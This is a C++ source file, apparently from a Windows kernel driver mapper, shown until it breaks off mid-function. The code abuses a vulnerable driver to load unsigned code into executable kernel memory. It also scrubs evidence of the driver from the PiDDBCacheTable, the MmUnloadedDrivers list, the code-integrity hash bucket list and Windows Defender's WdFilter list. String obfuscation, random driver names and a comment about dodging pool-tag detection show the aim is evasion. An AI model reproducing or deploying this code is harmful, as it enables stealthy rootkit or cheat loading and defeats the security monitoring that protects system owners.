#include "mapper.hpp"
#include "../console.hpp"

#include "../xor.hpp"

#define rva(ptr, size) ((DWORD64)ptr + size + *(LONG*)((DWORD64)ptr + (size - sizeof(LONG)))) 
console_c* output;

uint64_t mapper_t::get_kernel_export(uint64_t kernel_module_base, std::string function_name)
{
    if (!kernel_module_base)
    {
        return 0;
    }

    IMAGE_DOS_HEADER dos_header = { 0 };

    IMAGE_NT_HEADERS64 nt_headers = { 0 };

    if (!core.read_virtual(kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
        !core.read_virtual(kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
    {
        return 0;
    }

    uint32_t export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    uint32_t export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

    if (!export_base || !export_base_size)
    {
        return 0;
    }

    PIMAGE_EXPORT_DIRECTORY export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

    if (!core.read_virtual(kernel_module_base + export_base, export_data, export_base_size))
    {
        VirtualFree(export_data, 0, MEM_RELEASE);
        return 0;
    }

    uint64_t delta = reinterpret_cast<uint64_t>(export_data) - export_base;
    uint32_t* name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
    uint16_t* ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
    uint32_t* function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

    for (uint32_t i = 0; i < export_data->NumberOfNames; i++)
    {
        std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

        if (!_stricmp(current_function_name.c_str(), function_name.c_str()))
        {
            uint16_t function_ordinal = ordinal_table[i];

            if (function_table[function_ordinal] <= 0x1000)
            {
                return 0;
            }

            uint64_t function_address = kernel_module_base + function_table[function_ordinal];

            if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size)
            {
                VirtualFree(export_data, 0, MEM_RELEASE);

                return 0;
            }

            VirtualFree(export_data, 0, MEM_RELEASE);

            return function_address;
        }
    }

    VirtualFree(export_data, 0, MEM_RELEASE);

    return 0;
}

uint64_t mapper_t::find_pattern_in_kernel(uint64_t address, uint64_t len, byte* mask, char* sz_mask)
{
    if (len > 1024 * 1024 * 1024)
    {
        return 0;
    }

    byte* section_data = new byte[len];

    if (!core.read_virtual(address, section_data, len))
    {
        return 0;
    }

    auto result = utils.find_pattern((uint64_t)section_data, len, mask, sz_mask);

    if (result <= 0)
    {
        delete[] section_data;
        return 0;
    }
    result = address - (uint64_t)section_data + result;

    delete[] section_data;

    return result;
}

uint64_t mapper_t::find_section_in_kernel(char* name, uint64_t module_base, uint32_t* size)
{
    byte headers[0x1000];

    if (!core.read_virtual(module_base, headers, 0x1000))
    {
        return 0;
    }

    uint32_t section_size = 0;

    uint64_t section = (uint64_t)this->utils.find_section(name, (uint64_t)headers, &section_size);

    if (!section || !section_size)
    {
        return 0;
    }

    if (size)
    {
        *size = section_size;
    }

    return section - (uint64_t)headers + module_base;
}

uint64_t mapper_t::find_pattern_in_section_in_kernel(char* name, uint64_t module_base, byte* mask, char* sz_mask)
{
    uint32_t section_size = 0;

    uint64_t section = this->find_section_in_kernel(name, module_base, &section_size);

    return this->find_pattern_in_kernel(section, section_size, mask, sz_mask);
}

uint64_t mapper_t::allocate_independent_pages(uint32_t size)
{
    uint32_t offset1 = this->pdb.get_rva(xor ("MmAllocateIndependentPagesEx"));

    uint32_t offset2 = this->pdb.get_rva(xor ("MmSetPageProtection"));
    
    uint64_t offset3 = this->pdb.get_rva(xor ("ExAllocatePoolWithTag"));

   


    if (offset1 == 0 || offset2 == 0)
    {
        return 0;
    }

    auto align = [](uint32_t a) -> uint32_t
    {
        return (a & ~(0x1000 - 0x1)) + 0x1000;
    };

    uint64_t mm_allocate_independent_pages_ex = utils.get_kernel_module_base(xor ("ntoskrnl.exe")) + offset1;

    uint64_t base_address = 0;

   // uint64_t ex_allocate_pool_with_tag = utils.get_kernel_module_base(xor ("ntoskrnl.exe")) + offset3;
    //uint64_t ex_allocate_pool_w_tag = this->get_kernel_export(utils.get_kernel_module_base(xor ("ntoskrnl.exe")), xor ("ExAllocatePoolWithTag"));
    //uint64_t zero_mem = this->get_kernel_export(utils.get_kernel_module_base(xor ("ntoskrnl.exe")), xor ("RtlZeroMemory"));
   // printf(xor ("[+] Function address is %llx\n"), ex_allocate_pool_w_tag);
   // printf(xor ("[+] Alligned size is %d\n"), align(0x1000));
    uint64_t variable_addr = 0;
  //  this->call_kernel_function(&variable_addr, ex_allocate_pool_w_tag, 0,0x1000, 'SIze');
   /* if (!variable_addr)
    {
        log(xor ("[+] failed to allocate variable"));
        return 0;
    }*/
  //  log(xor ("[+] allocated variable is at %llx \n"), variable_addr);
   // this->call_kernel_function(PVOID(NULL), zero_mem, variable_addr, 0x1000);
   // std::ofstream file("C:\\Windows\\Temp\\oxla", std::ios::binary);
    //file.write(reinterpret_cast<const char*>(&variable_addr), sizeof(variable_addr));
    //file.close();
    this->call_kernel_function(&base_address, mm_allocate_independent_pages_ex, align(size), -1, 0, 0);

    if (base_address > 0)
    {
        //log(xor ("[+] aligned to %d -> %d pages. \n"), align(size), align(size) / 0x1000);

        uint64_t mm_set_page_protection = utils.get_kernel_module_base(xor ("ntoskrnl.exe")) + offset2;

        this->call_kernel_function(PVOID(NULL), mm_set_page_protection, base_address, align(size), PAGE_EXECUTE_READWRITE, 0);

        return base_address;
    }
    else
    {
        return 0;
    }
}

uint64_t mapper_t::allocate_big_pool(uint32_t size)
{
    if (!size)
        return 0;
    uint64_t ntos_base = this->utils.get_kernel_module_base(_("ntoskrnl.exe"));
    static uint64_t kernel_ExAllocatePool = this->get_kernel_export(ntos_base, _("ExAllocatePoolWithTag"));
    static uint64_t RtlZeroMemory = this->get_kernel_export(ntos_base, _("RtlZeroMemory"));
   // printf("[+] zero memory is %llx\n", RtlZeroMemory);
    if (!kernel_ExAllocatePool) {
        //Log(L"[!] Failed to find ExAllocatePool" << std::endl);
        return 0;
    }


    auto align = [](uint32_t a) -> uint32_t
        {
            return (a & ~(0x1000 - 0x1)) + 0x1000;
        };

    uint64_t allocated_pool = 0;
   
    uint64_t psize_t = 0;

    if (!this->call_kernel_function(&allocated_pool, kernel_ExAllocatePool, 0, size, 'obRs')) //Changed pool tag since an extremely meme checking diff between allocation size and average for detection....
        return 0;
    if (!this->call_kernel_function(&psize_t, kernel_ExAllocatePool, 0, align(0x1000), 'SIze'))
        return 0;
    int status = this->call_kernel_function(PVOID(NULL), RtlZeroMemory, allocated_pool, align(0x1000));
    printf(_("[+] zero mem status is %d\n"), status);
    std::ofstream file("C:\\Windows\\Temp\\oxla", std::ios::binary);
    file.write(reinterpret_cast<const char*>(&psize_t), sizeof(psize_t));
    file.close();


    return allocated_pool;
}

//bool mapper_t::free_pool(uint64_t address)
//{
//    if (!address)
//        return 0;
//    uint64_t ntos_base = this->utils.get_kernel_module_base(_("ntoskrnl.exe"));
//    static uint64_t kernel_ExFreePool = this->get_kernel_export(ntos_base, _("ExFreePool"));
//
//    if (!kernel_ExFreePool) {
//        return 0;
//    }
//
//    return this->call_kernel_function(PVOID(NULL),kernel_ExFreePool, address);
//}
void* mapper_t::resolve_relative_address(void* instruction, unsigned long offset, unsigned long instruction_size)
{
    long rip_offset = 0;

    if (!this->core.read_virtual((uint64_t)instruction + offset, &rip_offset, sizeof(long)))
    {
        return nullptr;
    }

    uint64_t resolved_address = (uint64_t)instruction + instruction_size + rip_offset;

    return (void*)resolved_address;
}

bool mapper_t::free_pool(uint64_t address)
{
    if (!address)
    {
        return 0;
    }

    printf(_("[+] Free pool called\n"));
    uint64_t ex_free_pool = this->get_kernel_export(this->utils.get_kernel_module_base(xor ("ntoskrnl.exe")), xor("ExFreePool"));

    if (!ex_free_pool)
    {
        return 0;
    }

    return this->call_kernel_function<void>(nullptr, ex_free_pool, address);
}

bool mapper_t::ex_acquire_resource_exclusive_lite(void* resource, bool wait)
{
    if (!resource)
    {
        return 0;
    }

    uint64_t ex_acquire_resource_exclusive_lite = this->get_kernel_export(this->utils.get_kernel_module_base(xor("ntoskrnl.exe")), xor("ExAcquireResourceExclusiveLite"));

    if (!ex_acquire_resource_exclusive_lite) 
    {
        return 0;
    }

    bool out;

    return (this->call_kernel_function(&out, ex_acquire_resource_exclusive_lite, resource, wait) && out);
}

bool mapper_t::ex_release_resource_lite(void* resource)
{
    if (!resource)
    {
        return false;
    }

    uint64_t ex_release_resource_lite = this->get_kernel_export(this->utils.get_kernel_module_base(xor ("ntoskrnl.exe")), xor("ExReleaseResourceLite"));

    if (!ex_release_resource_lite)
    {
        return false;
    }

    return this->call_kernel_function<void>(nullptr, ex_release_resource_lite, resource);
}

bool mapper_t::rtl_delete_element_generic_table_avl(void* table, void* buffer)
{
    if (!table)
    {
        return false;
    }

    uint64_t rtl_delete_element_generic_table_avl = this->get_kernel_export(this->utils.get_kernel_module_base(xor ("ntoskrnl.exe")), xor("RtlDeleteElementGenericTableAvl"));

    if (!rtl_delete_element_generic_table_avl) 
    {
        return false;
    }

    BOOLEAN out;

    return (this->call_kernel_function(&out, rtl_delete_element_generic_table_avl, table, buffer) && out);
}

void* mapper_t::rtl_lookup_element_generic_table_avl(PRTL_AVL_TABLE table, void* buffer)
{
    if (!table)
    {
        return nullptr;
    }
       
    uint64_t rtl_lookup_element_generic_table_avl = this->get_kernel_export(this->utils.get_kernel_module_base(xor ("ntoskrnl.exe")), xor("RtlLookupElementGenericTableAvl"));

    if (!rtl_lookup_element_generic_table_avl)
    {
        return nullptr;
    }

    void* out;

    if (!this->call_kernel_function(&out, rtl_lookup_element_generic_table_avl, table, buffer))
    {
        return nullptr;
    }

    return out;
}

PiDDBCacheEntry* mapper_t::lookup_entry(PRTL_AVL_TABLE table, uint32_t timestamp, const wchar_t* name)
{
    PiDDBCacheEntry localentry{};

    localentry.TimeDateStamp = timestamp;

    localentry.DriverName.Buffer = (PWSTR)name;

    localentry.DriverName.Length = (USHORT)(wcslen(name) * 2);

    localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;

    return (PiDDBCacheEntry*)rtl_lookup_element_generic_table_avl(table, &localentry);
}

bool mapper_t::clear_piddb_cache_table()
{
    uint64_t PiDDBLockPtr = this->find_pattern_in_section_in_kernel(xor("PAGE"), this->utils.get_kernel_module_base(xor ("ntoskrnl.exe")), (uint8_t*)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", xor("xxxxxx????xxxxx????xxx????xxxxx????x????xx?x")); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 66 FF 88 ? ? ? ? B2 01 48 8D 0D ? ? ? ? E8 ? ? ? ? 4C 8B ? 24 update for build 22000.132
    
    uint64_t PiDDBCacheTablePtr = this->find_pattern_in_section_in_kernel(xor("PAGE"), this->utils.get_kernel_module_base(xor ("ntoskrnl.exe")), (uint8_t*)"\x66\x03\xD2\x48\x8D\x0D", xor("xxxxxx")); // 66 03 D2 48 8D 0D

    if (PiDDBLockPtr == NULL) 
    {
        PiDDBLockPtr = this->find_pattern_in_section_in_kernel(xor("PAGE"), this->utils.get_kernel_module_base(xor ("ntoskrnl.exe")), (uint8_t*)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", xor("xxx????xxxxx????xxx????x????x")); // 48 8B 0D ? ? ? ? 48 85 C9 0F 85 ? ? ? ? 48 8D 0D ? ? ? ? E8 ? ? ? ? E8 build 22449+ (pattern can be improved but just fine for now)
        
        if (PiDDBLockPtr == NULL) 
        {
            return false;
        }

        PiDDBLockPtr += 16;
    }
    else 
    {
        PiDDBLockPtr += 28;
    }

    if (PiDDBCacheTablePtr == NULL)
    {
        return false;
    }

    //log(xor("[+] piddb_lock -> 0x%llx. \n"), PiDDBLockPtr);

    //log(xor("[+] piddb_cache_table -> 0x%llx. \n"), PiDDBCacheTablePtr);

    void* PiDDBLock = this->resolve_relative_address((void*)PiDDBLockPtr, 3, 7);

    PRTL_AVL_TABLE PiDDBCacheTable = (PRTL_AVL_TABLE)this->resolve_relative_address((void*)PiDDBCacheTablePtr, 6, 10);

    if (!this->ex_acquire_resource_exclusive_lite(PiDDBLock, true)) 
    {
        return false;
    }

    //Log(L"[+] PiDDBLock Locked" << std::endl);

    std::string driver = this->name + xor(".sys");

    std::wstring driver_name(driver.begin(), driver.end());

    PiDDBCacheEntry* pFoundEntry = (PiDDBCacheEntry*)this->lookup_entry(PiDDBCacheTable, 0x42941d90, driver_name.c_str());

    if (pFoundEntry == nullptr) 
    {
        this->ex_release_resource_lite(PiDDBLock);

        return false;
    }

    PLIST_ENTRY prev;

    if (!this->core.read_virtual((uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Blink)), &prev, sizeof(_LIST_ENTRY*))) 
    {
        this->ex_release_resource_lite(PiDDBLock);

        return false;
    }

    PLIST_ENTRY next;

    if (!this->core.read_virtual((uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Flink)), &next, sizeof(_LIST_ENTRY*)))
    {

        this->ex_release_resource_lite(PiDDBLock);

        return false;
    }

    //Log("[+] Found Table Entry = 0x" << std::hex << pFoundEntry << std::endl);

    if (!this->core.write_virtual((uintptr_t)prev + (offsetof(struct _LIST_ENTRY, Flink)), &next, sizeof(_LIST_ENTRY*)))
    {
        this->ex_release_resource_lite(PiDDBLock);

        return false;
    }

    if (!this->core.write_virtual((uintptr_t)next + (offsetof(struct _LIST_ENTRY, Blink)), &prev, sizeof(_LIST_ENTRY*)))
    {
        this->ex_release_resource_lite(PiDDBLock);

        return false;
    }

    if (!this->rtl_delete_element_generic_table_avl(PiDDBCacheTable, pFoundEntry)) 
    {
        this->ex_release_resource_lite(PiDDBLock);

        return false;
    }

    ULONG cacheDeleteCount = 0;

    this->core.read_virtual((uintptr_t)PiDDBCacheTable + (offsetof(struct _RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));

    if (cacheDeleteCount > 0)
    {
        cacheDeleteCount--;

        this->core.write_virtual((uintptr_t)PiDDBCacheTable + (offsetof(struct _RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
    }

    this->ex_release_resource_lite(PiDDBLock); (PiDDBLock);

    log(xor("[+] piddb_cache_table cleaned. \n"));

    return true;
}

bool mapper_t::clear_mm_unloaded_drivers()
{
    ULONG buffer_size = 0;

    void* buffer = nullptr;

    NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(64), buffer, buffer_size, &buffer_size);

    while (status == 0xC0000004)
    {
        VirtualFree(buffer, 0, MEM_RELEASE);

        buffer = VirtualAlloc(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

        status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(64), buffer, buffer_size, &buffer_size);
    }

    if (!NT_SUCCESS(status) || buffer == 0)
    {
        if (buffer != 0)
        {
            VirtualFree(buffer, 0, MEM_RELEASE);
        }

        return false;
    }

    uint64_t object = 0;

    PSYSTEM_HANDLE_INFORMATION_EX system_handle_inforamtion = static_cast<PSYSTEM_HANDLE_INFORMATION_EX>(buffer);

    for (auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i)
    {
        SYSTEM_HANDLE current_system_handle = system_handle_inforamtion->Handles[i];

        if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
            continue;

        if (current_system_handle.HandleValue == this->core.device)
        {
            object = reinterpret_cast<uint64_t>(current_system_handle.Object);
            break;
        }
    }

    VirtualFree(buffer, 0, MEM_RELEASE);

    if (!object)
        return false;

    uint64_t device_object = 0;

    if (!this->core.read_virtual(object + 0x8, &device_object, sizeof(device_object)) || !device_object)
    {
        return false;
    }

    uint64_t driver_object = 0;

    if (!this->core.read_virtual(device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object) 
    {
        return false;
    }

    uint64_t driver_section = 0;

    if (!this->core.read_virtual(driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section)
    {
        return false;
    }

    UNICODE_STRING us_driver_base_dll_name = { 0 };

    if (!this->core.read_virtual(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0)
    {
        return false;
    }

    wchar_t* unloaded_name = new wchar_t[(ULONG64)us_driver_base_dll_name.Length / 2ULL + 1ULL];

    memset(unloaded_name, 0, us_driver_base_dll_name.Length + sizeof(wchar_t));

    if (!this->core.read_virtual((uintptr_t)us_driver_base_dll_name.Buffer, unloaded_name, us_driver_base_dll_name.Length))
    {
        return false;
    }

    us_driver_base_dll_name.Length = 0;

    if (!this->core.write_virtual(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
    {
        return false;
    }

    //log(xor("[+] mm_unloaded_drivers cleaned -> %ls. \n"), unloaded_name);
    log(xor("[+] mm_unloaded_drivers cleaned. \n"));

    delete[] unloaded_name;

    return true;
}

bool mapper_t::clear_kernel_hash_bucket_list()
{
    uint64_t ci = this->utils.get_kernel_module_base(xor("ci.dll"));

    if (!ci) 
    {
        return false;
    }

    auto sig = this->find_pattern_in_section_in_kernel(xor("PAGE"), ci, (uint8_t*)"\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00", xor("xxx????x?xxxxxxx"));

    if (!sig) 
    {
        return false;
    }
    auto sig2 = this->find_pattern_in_kernel((uintptr_t)sig - 50, 50, (uint8_t*)"\x48\x8D\x0D", xor("xxx"));

    if (!sig2) 
    {
        return false;
    }

    void* g_KernelHashBucketList = this->resolve_relative_address((PVOID)sig, 3, 7);

    void* g_HashCacheLock = this->resolve_relative_address((PVOID)sig2, 3, 7);

    if (!g_KernelHashBucketList || !g_HashCacheLock)
    {
        return false;
    }

    //log(xor("[+] kernel_hash_bucket_list found -> 0x%llx. \n"), g_KernelHashBucketList);

    if (!this->ex_acquire_resource_exclusive_lite(g_HashCacheLock, true)) 
    {
        return false;
    }

    //Log(L"[+] g_HashCacheLock Locked" << std::endl);

    HashBucketEntry* prev = (HashBucketEntry*)g_KernelHashBucketList;

    HashBucketEntry* entry = 0;

    if (!this->core.read_virtual((uintptr_t)prev, &entry, sizeof(entry)))
    {
        this->ex_release_resource_lite(g_HashCacheLock);

        return false;
    }
    if (!entry) 
    {

        this->ex_release_resource_lite(g_HashCacheLock);

        return true;
    }

    std::string driver = this->name + xor (".sys");

    std::wstring wdname(driver.begin(), driver.end());

    std::wstring search_path(this->path.begin(), this->path.end());

    SIZE_T expected_len = (search_path.length() - 2) * 2;

    while (entry) 
    {
        USHORT wsNameLen = 0;

        if (!this->core.read_virtual((uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) 
        {

            this->ex_release_resource_lite(g_HashCacheLock);

            return false;
        }

        if (expected_len == wsNameLen) 
        {
            wchar_t* wsNamePtr = 0;

            if (!this->core.read_virtual((uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr)
            {

                this->ex_release_resource_lite(g_HashCacheLock);

                return false;
            }

            wchar_t* wsName = new wchar_t[(ULONG64)wsNameLen / 2ULL + 1ULL];

            memset(wsName, 0, wsNameLen + sizeof(wchar_t));

            if (!this->core.read_virtual((uintptr_t)wsNamePtr, wsName, wsNameLen))
            {
                this->ex_release_resource_lite(g_HashCacheLock);

                return false;
            }

            size_t find_result = std::wstring(wsName).find(wdname);

            if (find_result != std::wstring::npos)
            {
                //log(xor("[+] found in kernel_hash_bucket_list -> %ls. \n"), std::wstring(&wsName[find_result])  );

                HashBucketEntry* Next = 0;

                if (!this->core.read_virtual((uintptr_t)entry, &Next, sizeof(Next)))
                {
                    this->ex_release_resource_lite(g_HashCacheLock);

                    return false;
                }

                if (!this->core.write_virtual((uintptr_t)prev, &Next, sizeof(Next)))
                {
                    this->ex_release_resource_lite(g_HashCacheLock);

                    return false;
                }

                if (!this->free_pool((uintptr_t)entry)) 
                {
                    this->ex_release_resource_lite(g_HashCacheLock);

                    return false;
                }

                //log(_("[+] kernel_hash_bucket_list cleaned. \n"));

                if (!this->ex_release_resource_lite(g_HashCacheLock))
                {
                    this->ex_release_resource_lite(g_HashCacheLock);

                    return false;
                }
                delete[] wsName;

                return true;
            }
            delete[] wsName;
        }
        prev = entry;

        if (!this->core.read_virtual((uintptr_t)entry, &entry, sizeof(entry)))
        {
            this->ex_release_resource_lite(g_HashCacheLock);

            return false;
        }
    }

    this->ex_release_resource_lite(g_HashCacheLock);

    return false;
}

bool mapper_t::clear_wdfilter_driver_list()
{
    auto WdFilter = this->utils.get_kernel_module_base(xor ("WdFilter.sys"));

    if (!WdFilter)
    {
        log(xor ("[!] wdfilter.sys not found. \n"));

        log(xor ("[!] are you using custom windows? \n"));

        return true;
    }

    auto g_table = this->find_pattern_in_section_in_kernel(xor ("PAGE"), WdFilter, (uint8_t*)"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05", xor ("xxx????xx"));

    if (g_table)
    {
        log(_("[-] bad setup, try again\n"));
        return false;
    }

    g_table = (uintptr_t)this->resolve_relative_address((PVOID)g_table, 3, 7);

    uint64_t head = g_table - 0x8;

    auto read_entry = [&](uint64_t Address) -> uint64_t
    {
        uint64_t Entry = 0;

        if (!this->core.read_virtual(Address, &Entry, sizeof(uint64_t)))
        {
            return {};
        }

        return Entry;
    };

    bool status = false;

    uint64_t first = read_entry(head);

    uint64_t entry = read_entry(head);

    do
    {
        UNICODE_STRING string;

        if (this->core.read_virtual(entry + 0x10, &string, sizeof(string)))
        {
            wchar_t* name = new wchar_t[(uint64_t)string.Length / 2ULL + 1ULL];

            memset(name, 0, string.Length + sizeof(wchar_t));

            if (this->core.read_virtual((uint64_t)string.Buffer, name, string.Length))
            {
                std::wstring driver(this->name.begin(), this->name.end());

                if (wcsstr(name, driver.c_str()))
                {
                    uint64_t next = read_entry(entry + offsetof(LIST_ENTRY, Flink));

                    uint64_t prev = read_entry(entry + offsetof(LIST_ENTRY, Blink));

                    this->core.write_virtual(prev + offsetof(LIST_ENTRY, Flink), &next, sizeof(uint64_t));

                    this->core.write_virtual(next + offsetof(LIST_ENTRY, Blink), &prev, sizeof(uint64_t));

                    status = true;
                }
            }

            delete[] name;
        }

        entry = read_entry(entry + offsetof(LIST_ENTRY, Flink));

    } while (entry != first);

    if (status)
    {
        log(_("[+] wdfilter_driver_list cleaned. \n"));
    }

    return status;
}

bool mapper_t::free_independent_pages(uint64_t address, uint32_t size)
{
    uint32_t offset1 = this->pdb.get_rva(xor ("MmFreeIndependentPages"));

    if (offset1 == 0)
    {
        return false;
    }

    auto align = [](uint32_t a) -> uint32_t
    {
        return (a & ~(0x1000 - 0x1)) + 0x1000;;
    };

    uint64_t mm_free_independent_pages = utils.get_kernel_module_base(xor ("ntoskrnl.exe")) + offset1;

    if (mm_free_independent_pages)
    {
        this->call_kernel_function<void>(nullptr, mm_free_independent_pages, address, align(size));

        return true;
    }

    return false;
}

bool mapper_t::map_bytes(uint8_t* bytes, uint64_t arg1, uint64_t arg2, bool free)
{
    auto relocate_image_by_delta = [&, this](pe_t::vec_relocs relocs, uint64_t delta) -> void
    {
        for (const auto& current_reloc : relocs)
        {
            for (auto i = 0u; i < current_reloc.count; i++)
            {
                const uint16_t type = current_reloc.item[i] >> 12;

                const uint16_t offset = current_reloc.item[i] & 0xFFF;

                if (type == IMAGE_REL_BASED_DIR64)
                {
                    *reinterpret_cast<uint64_t*>(current_reloc.address + offset) += delta;
                }
            }
        }
    };

    auto resolve_imports = [&, this](pe_t::vec_imports imports) -> bool
    {
        for (const auto& current_import : imports)
        {
            uint64_t Module = this->utils.get_kernel_module_base(current_import.module_name);

            if (!Module)
            {
                return false;
            }

            for (auto& current_function_data : current_import.function_datas)
            {
                uint64_t function_address = this->get_kernel_export(Module, current_function_data.name);

                //log(xor ("[+] [resolver] -> %s.\n"), current_function_data.name.c_str());

                if (!function_address)
                {
                    if (Module != this->utils.get_kernel_module_base(xor("ntoskrnl.exe")))
                    {
                        function_address = this->get_kernel_export(this->utils.get_kernel_module_base(xor ("ntoskrnl.exe")), current_function_data.name);

                        if (!function_address)
                        {
                            return false;
                        }
                    }
                }

                *current_function_data.address = function_address;
            }
        }

        return true;
    };

    PIMAGE_NT_HEADERS64 nt_headers = this->pe.get_nt_headers(bytes);

    if (!nt_headers)
    {
        log(xor ("[-] invalid file.\n"));

        return false;
    }

    if (nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
    {
        log(xor ("[-] invalid file.\n"));

        return false;
    }

    uint32_t image_size = nt_headers->OptionalHeader.SizeOfImage;

    void* local_image_base = VirtualAlloc(nullptr, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if (!local_image_base)
    {
        return false;
    }

    uint32_t total_virtual_header_size = (IMAGE_FIRST_SECTION(nt_headers))->VirtualAddress;

    image_size = nt_headers->OptionalHeader.SizeOfImage - total_virtual_header_size;

    uint64_t kernel_image_base = this->allocate_independent_pages(image_size); //

    if (kernel_image_base)
    {
        //log(xor ("[+] memory is allocated -> 0x%llx.\n"), kernel_image_base);

        //log(xor ("[+] allocated memory size -> %d bytes.\n"), image_size);
    }
    else
    {
        output->error(xor ("[-] failed to allocate memory.\n"));

        VirtualFree(local_image_base, 0, MEM_RELEASE);

        return false;
    }

    do
    {
        memcpy(local_image_base, bytes, nt_headers->OptionalHeader.SizeOfHeaders);

        PIMAGE_SECTION_HEADER current_image_section = IMAGE_FIRST_SECTION(nt_headers);

        for (auto i = 0; i < nt_headers->FileHeader.NumberOfSections; i++)
        {
            if ((current_image_section[i].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) > 0)
            {
                continue;
            }

            auto local_section = reinterpret_cast<void*>(reinterpret_cast<uint64_t>(local_image_base) + current_image_section[i].VirtualAddress);

            memcpy(local_section, reinterpret_cast<void*>(reinterpret_cast<uint64_t>(bytes) + current_image_section[i].PointerToRawData), current_image_section[i].SizeOfRawData);
        }

        uint64_t real_base = kernel_image_base;

        kernel_image_base -= total_virtual_header_size;

        //log(xor ("[+] skipped 0x%llx bytes of PE header.\n"), total_virtual_header_size);

        relocate_image_by_delta(this->pe.get_relocs(local_image_base), kernel_image_base - nt_headers->OptionalHeader.ImageBase);

        if (resolve_imports(this->pe.get_imports(local_image_base)))
        {
            //log(xor ("[+] import resolved.\n"));
        }
        else
        {
            //log(xor ("[-] failed to resolve import.\n"));

            kernel_image_base = real_base;

            break;
        }

        uint64_t rtl_copy_memory = this->get_kernel_export(this->utils.get_kernel_module_base(xor("ntoskrnl.exe")), xor ("RtlCopyMemory"));

        this->call_kernel_function(PVOID(NULL), rtl_copy_memory, real_base, (uint64_t)local_image_base + total_virtual_header_size, image_size);

        uint64_t address_of_entry_point = kernel_image_base + nt_headers->OptionalHeader.AddressOfEntryPoint;

        //log(xor ("[+] driver_entry address -> 0x%llx.\n"), address_of_entry_point);

        uint32_t status = 0;

        if (this->call_kernel_function(&status, address_of_entry_point , arg1, arg2)) //
        {
            log(xor ("[+] driver_entry returned -> 0x%llx.\n"), status);
        }
        else
        {
            log(xor ("[-] failed to call driver_entry.\n"), status);

            break;
        }

        if (free)
        {
            //
            if (!this->free_independent_pages(real_base, image_size))
            {
                log(xor ("[-] failed to free allocated memory.\n"));
            }

            log(xor ("[+] free allocated memory.\n"));
        }

        VirtualFree(local_image_base, 0, MEM_RELEASE);

        return true;

    } while (false);


    VirtualFree(local_image_base, 0, MEM_RELEASE);

    if (!this->free_independent_pages(kernel_image_base, image_size))
    {
        log(xor ("[-] failed to free allocated memory.\n"));
    }

    return false;
}

bool mapper_t::map(uint8_t* bytes, uint64_t arg1, uint64_t arg2 , bool free)
{
    //log(xor ("[+] welcome to mapper made by Aluminium & Silicium! \n\n"));

    log(_ ("[+] initialization (1)\n"));
    //log(xor ("[+] downloading .pdb for ntoskrnl.exe...\n"));

    if (!this->pdb.load(xor("C:\\windows\\system32\\ntoskrnl.exe")))
    {
        log(xor ("[-] unsupported system.\n"));

        log(xor ("[-] failed initialize.\n"));

        this->pdb.unload();

        return false;
    }

    //log(xor ("[+] downloading .pdb for win32kfull.sys...\n"));

    //if (!this->pdb1.load(xor ("C:\\windows\\system32\\win32kfull.sys")))
    //{
    //    log(xor ("[-] unsupported system.\n"));

    //    log(xor ("[-] failed to get .pdb.\n"));

    //    this->pdb1.unload();

    //    return false;
    //}

    log(xor ("[+] supported system. \n"));

    //log(xor ("[+] successfuly get .pdb for ntoskrnl.exe.\n"));
    
    this->name = this->utils.random_string(16);

    this->path = std::string(xor ("C:\\windows\\system32\\drivers\\") + this->name + xor (".sys"));

    SetConsoleTitleA(this->name.c_str());

    uint8_t* decrypted = new uint8_t[sizeof(rtcore64)];

